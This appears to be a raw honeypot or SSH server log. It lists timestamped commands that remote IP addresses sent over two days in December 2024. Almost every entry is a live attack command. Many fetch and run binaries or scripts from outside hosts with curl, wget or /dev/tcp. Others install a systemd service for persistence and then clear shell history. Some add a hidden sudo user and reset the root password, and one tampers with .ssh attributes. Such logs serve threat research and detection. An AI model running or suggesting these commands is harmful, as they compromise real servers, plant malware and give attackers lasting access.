start
2024-12-12 00:54:22.953497 - ('195.178.110.6', 52444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:54:29.943885 - ('195.178.110.6', 52456) - apt
2024-12-12 00:54:31.070120 - ('195.178.110.6', 52456) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:54:37.928577 - ('195.178.110.6', 43048) - apt
2024-12-12 00:54:39.029651 - ('195.178.110.6', 43048) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:26:59.170492 - ('45.148.10.203', 52032) - apt
2024-12-12 01:27:00.245907 - ('45.148.10.203', 52032) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:07.232966 - ('45.148.10.203', 57110) - apt
2024-12-12 01:27:08.394082 - ('45.148.10.203', 57110) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:15.540333 - ('45.148.10.203', 44676) - apt
2024-12-12 01:27:16.717094 - ('45.148.10.203', 44676) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:23.853708 - ('45.148.10.203', 36638) - apt
2024-12-12 01:27:25.020155 - ('45.148.10.203', 36638) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:31.807104 - ('45.148.10.203', 41090) - apt
2024-12-12 01:27:32.888713 - ('45.148.10.203', 41090) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:39.682372 - ('45.148.10.203', 41114) - apt
2024-12-12 01:27:40.765526 - ('45.148.10.203', 41114) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:47.691129 - ('45.148.10.203', 42280) - apt
2024-12-12 01:27:48.780987 - ('45.148.10.203', 42280) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:27:55.584194 - ('45.148.10.203', 47566) - apt
2024-12-12 01:27:56.677073 - ('45.148.10.203', 47566) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:28:03.477903 - ('45.148.10.203', 45570) - apt
2024-12-12 01:28:04.564137 - ('45.148.10.203', 45570) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:28:11.718288 - ('45.148.10.203', 45590) - apt
2024-12-12 01:28:12.894397 - ('45.148.10.203', 45590) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:28:19.886297 - ('45.148.10.203', 38394) - apt
2024-12-12 01:28:21.004125 - ('45.148.10.203', 38394) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:28:28.138992 - ('45.148.10.203', 55032) - apt
2024-12-12 01:28:29.302504 - ('45.148.10.203', 55032) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:28:36.107065 - ('45.148.10.203', 43264) - apt
2024-12-12 01:28:37.196517 - ('45.148.10.203', 43264) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 01:53:52.826007 - ('71.195.123.250', 50387) - mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F
2024-12-12 03:31:48.335356 - ('195.178.110.6', 50994) - apt
2024-12-12 03:31:49.431357 - ('195.178.110.6', 50994) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:31:56.445289 - ('195.178.110.6', 57150) - apt
2024-12-12 03:31:57.545386 - ('195.178.110.6', 57150) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:32:04.532165 - ('195.178.110.6', 50812) - apt
2024-12-12 03:32:05.628923 - ('195.178.110.6', 50812) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:32:12.538733 - ('195.178.110.6', 49908) - apt
2024-12-12 03:32:13.730480 - ('195.178.110.6', 49908) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:32:20.793285 - ('195.178.110.6', 49938) - apt
2024-12-12 03:32:21.902003 - ('195.178.110.6', 49938) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:32:29.159740 - ('195.178.110.6', 56958) - apt
2024-12-12 03:32:30.351710 - ('195.178.110.6', 56958) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 05:25:54.552328 - ('46.19.143.66', 48296) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 FpEXYdbE) system && sudo usermod -aG sudo system
2024-12-12 05:25:55.358208 - ('46.19.143.66', 48296) - lscpu && echo -e "FpEXYdbE\nFpEXYdbE" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 06:26:39.774555 - ('154.213.187.182', 42316) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:26:40.978838 - ('154.213.187.182', 42502) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:27:30.064987 - ('154.213.187.182', 58944) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:27:30.634438 - ('154.213.187.182', 58928) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:31:05.767362 - ('154.213.187.182', 33712) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:31:06.187361 - ('154.213.187.182', 33704) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:51:59.669800 - ('154.213.187.182', 44118) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 06:52:00.570786 - ('154.213.187.182', 44112) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 07:38:26.316205 - ('37.19.210.33', 60532) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 07:38:26.442819 - ('37.19.210.33', 60773) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 08:20:07.256340 - ('87.120.113.231', 58264) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-12 09:26:52.435940 - ('154.213.187.182', 48812) - cat /proc/uptime
2024-12-12 09:45:17.268867 - ('46.19.143.66', 60466) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 YbKyV6vU) system && sudo usermod -aG sudo system
2024-12-12 09:45:18.090671 - ('46.19.143.66', 60466) - lscpu && echo -e "YbKyV6vU\nYbKyV6vU" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 12:44:08.298031 - ('218.92.0.132', 37286) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-12 12:44:10.641626 - ('218.92.0.132', 37286) - ls -la /var/run/gcc.pid
2024-12-12 15:29:54.804388 - ('45.148.10.203', 60444) - apt
2024-12-12 15:29:56.727626 - ('45.148.10.203', 60444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 15:30:05.677535 - ('45.148.10.203', 50844) - apt
2024-12-12 15:30:07.691006 - ('45.148.10.203', 50844) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 15:30:17.766187 - ('45.148.10.203', 37222) - apt
2024-12-12 15:30:19.185022 - ('45.148.10.203', 37222) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 15:30:27.093450 - ('45.148.10.203', 46762) - apt
2024-12-12 15:30:28.539731 - ('45.148.10.203', 46762) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 15:30:37.574497 - ('45.148.10.203', 37506) - apt
2024-12-12 15:30:39.490673 - ('45.148.10.203', 37506) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 16:08:07.017693 - ('37.19.210.33', 64757) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 16:08:08.366005 - ('37.19.210.33', 64761) - cd /tmp; wget http://185.157.247.35/a.sh -O -> a;chmod 777 a;./a; curl http://185.157.247.35/a.sh -o -> a;chmod 777 a;./a
2024-12-12 19:10:47.832952 - ('46.19.143.66', 37938) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qpwQptec) system && sudo usermod -aG sudo system
2024-12-12 19:10:48.523846 - ('46.19.143.66', 37938) - lscpu && echo -e "qpwQptec\nqpwQptec" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 19:24:00.693090 - ('185.92.181.132', 56532) - uname -a
2024-12-12 23:57:01.527262 - ('87.120.113.231', 35728) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-13 01:14:20.950716 - ('46.19.143.66', 56912) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zWt4RhCu) system && sudo usermod -aG sudo system
2024-12-13 01:14:21.768720 - ('46.19.143.66', 56912) - lscpu && echo -e "zWt4RhCu\nzWt4RhCu" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-13 04:10:26.818376 - ('45.148.10.203', 38304) - apt
2024-12-13 04:10:28.370295 - ('45.148.10.203', 38304) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:10:35.340920 - ('45.148.10.203', 50506) - apt
2024-12-13 04:10:36.443592 - ('45.148.10.203', 50506) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:10:43.603714 - ('45.148.10.203', 34052) - apt
2024-12-13 04:10:44.774520 - ('45.148.10.203', 34052) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:10:52.620420 - ('45.148.10.203', 34056) - apt
2024-12-13 04:10:54.106374 - ('45.148.10.203', 34056) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:01.187859 - ('45.148.10.203', 59250) - apt
2024-12-13 04:11:02.333947 - ('45.148.10.203', 59250) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:09.269793 - ('45.148.10.203', 55442) - apt
2024-12-13 04:11:10.359184 - ('45.148.10.203', 55442) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:17.515265 - ('45.148.10.203', 33528) - apt
2024-12-13 04:11:18.687128 - ('45.148.10.203', 33528) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:25.838238 - ('45.148.10.203', 45830) - apt
2024-12-13 04:11:27.007268 - ('45.148.10.203', 45830) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:34.845371 - ('45.148.10.203', 49694) - apt
2024-12-13 04:11:36.274071 - ('45.148.10.203', 49694) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:43.220292 - ('45.148.10.203', 42806) - apt
2024-12-13 04:11:44.322264 - ('45.148.10.203', 42806) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:11:52.052399 - ('45.148.10.203', 42818) - apt
2024-12-13 04:11:53.480378 - ('45.148.10.203', 42818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:00.462002 - ('45.148.10.203', 45804) - apt
2024-12-13 04:12:01.615029 - ('45.148.10.203', 45804) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:08.757857 - ('45.148.10.203', 59396) - apt
2024-12-13 04:12:09.925228 - ('45.148.10.203', 59396) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:16.723452 - ('45.148.10.203', 52532) - apt
2024-12-13 04:12:17.810384 - ('45.148.10.203', 52532) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:25.606611 - ('45.148.10.203', 38586) - apt
2024-12-13 04:12:27.007770 - ('45.148.10.203', 38586) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:34.925003 - ('45.148.10.203', 40196) - apt
2024-12-13 04:12:36.508291 - ('45.148.10.203', 40196) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:43.340752 - ('45.148.10.203', 41654) - apt
2024-12-13 04:12:44.441098 - ('45.148.10.203', 41654) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:12:52.506864 - ('45.148.10.203', 41662) - apt
2024-12-13 04:12:54.128060 - ('45.148.10.203', 41662) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:13:00.971982 - ('45.148.10.203', 42194) - apt
2024-12-13 04:13:02.078465 - ('45.148.10.203', 42194) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:13:09.194695 - ('45.148.10.203', 49360) - apt
2024-12-13 04:13:10.349939 - ('45.148.10.203', 49360) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:13:18.259753 - ('45.148.10.203', 33004) - apt
2024-12-13 04:13:19.737477 - ('45.148.10.203', 33004) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 04:17:15.755042 - ('182.176.168.253', 14033) - cd ~; chattr -ia .ssh; lockr -ia .ssh
